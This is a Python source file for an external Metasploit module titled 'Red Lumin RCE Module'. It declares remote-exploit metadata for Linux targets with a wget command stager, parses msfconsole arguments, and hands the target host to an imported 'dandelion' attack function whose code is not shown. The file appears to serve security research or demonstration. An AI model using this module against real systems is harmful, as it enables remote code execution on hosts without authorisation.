#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# extra modules
from metasploit import module
import json
from red_lumin.attack import run_dandelion_attack


metadata = {
    'name': 'Red Lumin RCE Module',
    'description': '''
        RCE Module
    ''',
    'authors': [
        'S3B4SZ17 <sebastian.zumbado@sysdig.com>'
    ],
    'date': '2025-09-01',
    'license': 'MSF_LICENSE',
    'references': [
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'aarch64'},
        {'platform': 'linux', 'arch': 'x64'},
        {'platform': 'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 80},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False},
        'path': {'type': 'string', 'description': 'An example path', 'required': False, 'default': '/'},
        'arguments': {'type': 'dict', 'description': 'Dictionary of arguments to pass to the command', 'required': False, 'default': "{}"}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings through the JSON-RPC so we need to convert them manually.
    I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True
            if type_to_convert == 'port':
                corrected_args[k] = int(v)
            if type_to_convert == 'dict':
                try:
                    corrected_args[k] = json.loads(v)
                except json.JSONDecodeError:
                    module.log("Invalid dict format for argument '{}', using default value".format(k))
                    corrected_args[k] = {}

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)
    module.LogHandler.setup(msg_prefix=f"dandelion - ")
    run_dandelion_attack(target=args['rhost'])


if __name__ == '__main__':
    module.log("Starting Dandelion attack ...", 'info')
    module.run(metadata, run)
